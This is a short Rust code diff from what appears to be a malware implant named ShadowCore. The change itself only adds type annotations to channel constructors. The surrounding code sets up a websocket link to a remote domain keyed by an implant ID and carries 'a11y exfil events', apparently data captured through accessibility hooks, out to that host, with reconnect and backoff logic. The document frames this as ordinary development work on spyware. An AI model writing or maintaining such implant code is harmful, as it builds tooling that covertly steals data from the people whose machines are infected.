@@ -58,8 +58,8 @@ struct ShadowCore {
 impl ShadowCore {
     async fn start(&self, mut event_rx: tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>) -> anyhow::Result<()> {
         let ws = transport::websocket::WsTransport::new(&self.domain, &self.implant_id);
-        let (tx_send, rx_send) = mpsc::channel(100);
-        let (tx_recv, mut rx_recv) = mpsc::channel(100);
+        let (tx_send, rx_send) = mpsc::channel::<Vec<u8>>(100);
+        let (tx_recv, mut rx_recv) = mpsc::channel::<Vec<u8>>(100);
 
         // Wire a11y exfil events into transport outbound channel
         let event_tx_send = tx_send.clone();
@@ -82,8 +82,8 @@ impl ShadowCore {
             let max_backoff = tokio::time::Duration::from_secs(60);
             
             loop {
-                let (tx_internal, rx_internal) = mpsc::channel(100);
-                let (tx_recv_internal, mut rx_recv_inner) = mpsc::channel(100);
+                let (tx_internal, rx_internal) = mpsc::channel::<Vec<u8>>(100);
+                let (tx_recv_internal, mut rx_recv_inner) = mpsc::channel::<Vec<u8>>(100);
                 
                 let rx_shared_clone = rx_send_shared.clone();
                 let proxy = tokio::spawn(async move {
